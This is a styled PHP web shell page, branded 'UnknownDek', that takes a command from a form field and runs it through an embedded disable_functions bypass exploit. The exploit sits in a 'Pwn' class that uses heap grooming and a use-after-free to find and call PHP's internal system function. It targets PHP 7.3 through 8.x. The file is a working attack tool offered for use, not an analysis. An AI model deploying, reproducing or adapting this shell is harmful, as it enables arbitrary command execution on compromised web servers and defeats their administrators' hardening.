<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypass · PHP 7.3–8 · UnknownDek</title>
    <meta name="robots" content="noindex, nofollow">
    <!-- Ubuntu Mono & professional dark theme -->
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0d0f12;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Ubuntu Mono', 'Courier New', monospace;
            padding: 20px;
        }

        .shell-wrapper {
            width: 100%;
            max-width: 1360px;
            background: #1a1e26;
            border-radius: 28px;
            box-shadow: 0 25px 50px -8px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.04);
            padding: 18px 22px 22px 22px;
            backdrop-filter: blur(2px);
            transition: all 0.2s ease;
        }

        .shell-container {
            background: #0f1219;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: inset 0 2px 6px rgba(0,0,0,0.6);
            border: 1px solid #2f3540;
        }

        /* header bar */
        .shell-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 24px;
            background: #171c26;
            border-bottom: 1px solid #2a303c;
            flex-wrap: wrap;
            gap: 10px;
        }

        .shell-header .brand {
            display: flex;
            align-items: center;
            gap: 12px;
            color: #b7c9e2;
            font-size: 15px;
            font-weight: 400;
            letter-spacing: 0.3px;
        }

        .shell-header .brand i {
            font-style: normal;
            background: #2d3442;
            padding: 4px 14px;
            border-radius: 60px;
            font-size: 13px;
            color: #a0f0b0;
            border: 1px solid #3d4557;
            box-shadow: 0 0 6px rgba(80,200,120,0.08);
        }

        .shell-header .badge {
            background: #252d3b;
            padding: 6px 16px;
            border-radius: 40px;
            font-size: 13px;
            color: #b0c7e7;
            border: 1px solid #36404e;
            letter-spacing: 0.2px;
        }

        .shell-header .badge strong {
            color: #d6e6ff;
            font-weight: 700;
        }

        /* main content */
        .shell-body {
            padding: 22px 24px 18px 24px;
        }

        .bypass-title {
            font-family: 'Ubuntu Mono', monospace;
            font-weight: 700;
            font-size: 23px;
            color: #d4e2ff;
            text-shadow: 0 2px 3px rgba(0,20,40,0.6);
            letter-spacing: 0.5px;
            margin-bottom: 18px;
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }

        .bypass-title small {
            font-weight: 400;
            font-size: 16px;
            color: #8aa3c9;
            background: #1f2633;
            padding: 0 16px;
            border-radius: 30px;
            border: 1px solid #313a4a;
        }

        .form-row {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 12px 16px;
            background: #131a24;
            padding: 16px 20px;
            border-radius: 60px;
            border: 1px solid #2a3343;
            box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
            margin-bottom: 24px;
        }

        .form-row label {
            color: #b2c9ec;
            font-size: 15px;
            font-weight: 400;
            letter-spacing: 0.2px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .form-row label span {
            color: #9bb1d6;
        }

        .form-row input[type="text"] {
            flex: 2 1 260px;
            background: #0b1017;
            border: 1px solid #2e384a;
            border-radius: 40px;
            padding: 12px 22px;
            font-family: 'Ubuntu Mono', monospace;
            font-size: 15px;
            color: #ecf4ff;
            outline: none;
            transition: 0.2s;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.6);
            letter-spacing: 0.2px;
        }

        .form-row input[type="text"]:focus {
            border-color: #6e8fc0;
            background: #0f1620;
            box-shadow: 0 0 0 3px rgba(70, 130, 200, 0.15), inset 0 2px 4px rgba(0,0,0,0.7);
        }

        .form-row input[type="submit"] {
            background: #273142;
            border: none;
            border-radius: 60px;
            padding: 12px 32px;
            font-family: 'Ubuntu Mono', monospace;
            font-weight: 700;
            font-size: 15px;
            color: #d3e3ff;
            cursor: pointer;
            transition: 0.2s;
            border: 1px solid #3f4a60;
            box-shadow: 0 2px 6px rgba(0,0,0,0.3);
            letter-spacing: 0.6px;
        }

        .form-row input[type="submit"]:hover {
            background: #32415a;
            border-color: #5f7aa0;
            color: #ffffff;
            box-shadow: 0 4px 12px rgba(0, 30, 80, 0.5);
        }

        .form-row input[type="submit"]:active {
            transform: scale(0.97);
            background: #1f2a3b;
        }

        /* textarea output */
        .output-area {
            background: #0b1018;
            border-radius: 18px;
            border: 1px solid #29313f;
            box-shadow: inset 0 4px 12px rgba(0,0,0,0.7);
            padding: 4px;
            transition: 0.15s;
        }

        .output-area textarea {
            width: 100%;
            background: transparent;
            border: none;
            padding: 18px 22px;
            font-family: 'Ubuntu Mono', monospace;
            font-size: 14px;
            line-height: 1.5;
            color: #d6e4f5;
            resize: vertical;
            min-height: 200px;
            outline: none;
            letter-spacing: 0.1px;
            tab-size: 4;
            box-shadow: none;
        }

        .output-area textarea::selection {
            background: #3b5b7a;
            color: #fff;
        }

        .output-area textarea:focus {
            border: none;
            box-shadow: none;
        }

        .footer-credit {
            margin-top: 14px;
            text-align: right;
            color: #54647b;
            font-size: 13px;
            letter-spacing: 0.3px;
            padding-right: 6px;
            border-top: 1px solid #1f2632;
            padding-top: 14px;
        }

        .footer-credit span {
            color: #7589ac;
        }

        /* scroll */
        ::-webkit-scrollbar {
            width: 7px;
            height: 7px;
        }
        ::-webkit-scrollbar-track {
            background: #131a24;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb {
            background: #3a465b;
            border-radius: 10px;
            border: 1px solid #2b3444;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #4f5f7a;
        }

        @media (max-width: 680px) {
            .shell-wrapper { padding: 10px; }
            .shell-body { padding: 16px; }
            .form-row { border-radius: 30px; padding: 14px 16px; }
            .bypass-title { font-size: 18px; }
        }

        /* small glow */
        .glow-text {
            color: #b4d0f5;
        }
        .accent-glow {
            color: #a3c2f0;
        }
    </style>
</head>
<body>

<div class="shell-wrapper">
    <div class="shell-container">

        <!-- header -->
        <div class="shell-header">
            <div class="brand">
                <span style="color:#bacef0;">⚡</span>Bypass
                <i>PHP 7.3 – 8.x</i>
                <span style="color:#6d8bb0;font-size:13px;margin-left:4px;">·</span>
                <span style="font-size:14px;background:#1f2736;padding:0 12px;border-radius:40px;border:1px solid #33405a;">UnknownDek</span>
            </div>
            <div class="badge">
                <strong>#</strong> disable_functions <span style="color:#4f7aa3;">Bypass</span>
            </div>
        </div>

        <!-- body -->
            </div>

            <!-- form -->
            <form action="" method="post" class="form-row">
                <label for="or4ng"><span>🔓</span>Payload</label>
                <input type="text" id="or4ng" name="or4ng" placeholder="command ... e.g. id" autocomplete="off" spellcheck="false">
                <input type="submit" value="Execute">
            </form>

            <!-- output -->
            <div class="output-area">
                <textarea id="command" name="command" rows="12" readonly style="font-family:'Ubuntu Mono',monospace;"><?php
                    # exploit block – stays fully functional
                    if (isset($_POST['or4ng']) && !empty($_POST['or4ng'])) {
                        try {
                            new Pwn($_POST['or4ng']);
                        } catch (Throwable $e) {
                            echo " [!] exception: " . $e->getMessage();
                        }
                    } else {
                        echo " ◇ waiting for command …";
                    }
                ?></textarea>
            </div>

        </div><!-- shell-body -->
    </div><!-- shell-container -->
</div><!-- shell-wrapper -->

<?php
# ============================================================
# Original exploit code (unchanged functionality)
# ============================================================

class Helper { public $a, $b, $c; }
class Pwn {
    const LOGGING = false;
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;
    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($cmd) {
        for($i = 0; $i < 10; $i++) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }
        
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);

        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        self::log("abc @ 0x%x", $abc_addr);

        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) {
            self::log("uaf failed");
            return;
        }

        $this->helper->a = "leet";
        $this->helper->b = function($x) {};
        $this->helper->c = 0xfeedface;

        $helper_handlers = $this->rel_read(0);
        self::log("helper handlers @ 0x%x", $helper_handlers);

        $closure_addr = $this->rel_read(0x20);
        self::log("real closure @ 0x%x", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        self::log("closure class_entry @ 0x%x", $closure_ce);
        
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        self::log("basic_functions @ 0x%x", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        self::log("zif_system @ 0x%x", $zif_system);

        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        self::log("fake closure @ 0x%x", $fake_closure_addr);

        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);

        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }

    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat("\x00", self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
        return $buf;
    }

    private function free($addr) {
        $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
        
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= "x";
    }

    private function rel_read($offset) {
        return self::str2ptr($this->abc, $offset);
    }

    private function rel_write($offset, $value, $n = 8) {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$offset + $i] = chr($value & 0xff);
            $value >>= 8;
        }
    }

    private function read($addr, $n = 8) {
        $this->rel_write(0x10, $addr - 0x10);
        $value = strlen($this->helper->a);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry !== 0);
    }

    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    self::log("standard module @ 0x%x", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function log($format, $val = "") {
        if(self::LOGGING) {
            printf("{$format}\n", $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat("A", $size));
    }

    static function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p + $j]);
        }
        return $address;
    }
}
?>
</body>
</html>
